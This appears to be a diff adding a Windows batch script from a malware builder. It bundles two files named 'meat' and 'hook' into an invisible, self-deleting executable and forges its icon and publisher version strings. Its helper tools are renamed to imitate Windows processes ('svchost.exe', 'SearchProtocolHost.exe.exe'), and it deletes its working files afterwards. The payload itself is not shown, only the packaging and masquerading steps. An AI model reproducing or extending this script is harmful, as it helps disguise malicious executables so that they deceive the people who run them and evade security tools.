@@ -1,0 +1,31 @@
+@echo off
+echo %CD%
+set /p exeName=<exeName
+set /p CompanyName=<CompanyName
+set /p FileDescription=<FileDescription
+set /p FileVersion=<FileVersion
+set /p InternalName=<InternalName
+set /p LegalCopyright=<LegalCopyright
+set /p OriginalFilename=<OriginalFilename
+set /p ProductName=<ProductName
+set /p ProductVersion=<ProductVersion
+type targetIco>myIco
+set /p targetIco=<myIco
+echo %targetIco%
+set /a rand=%random% %% 99999+1
+echo set my=%rand%>rand
+copy /y /b rand+ReleaseThread.txt TAS.obj
+ren meat %rand%
+ren hook %rand%0723.exe
+start /LOW SearchProtocolHost.exe.exe /bat TAS.obj /exe "Output.exe" /extractdir 1 /workdir 1 /include "%rand%0723.exe" /include "%rand%" /deleteonexit /icon "%targetIco%" /invisible
+svchost.exe "Output.exe" --set-version-string CompanyName "%CompanyName%"
+svchost.exe "Output.exe" --set-file-version "%FileVersion%"
+svchost.exe "Output.exe" --set-version-string FileDescription "%FileDescription%"
+svchost.exe "Output.exe" --set-version-string InternalName "%InternalName%"
+svchost.exe "Output.exe" --set-version-string LegalCopyright "%LegalCopyright%"
+svchost.exe "Output.exe" --set-version-string OriginalFilename "%OriginalFilename%"
+svchost.exe "Output.exe" --set-version-string ProductName "%ProductName%"
+svchost.exe "Output.exe" --set-product-version "%ProductVersion%"
+for %%d in (CompanyName FileDescription FileVersion InternalName LegalCopyright OriginalFilename ProductName ProductVersion %rand%20110723 %rand% targetIco TAS.obj rand Temp) do (
+        del/f/s/q %%d
+)
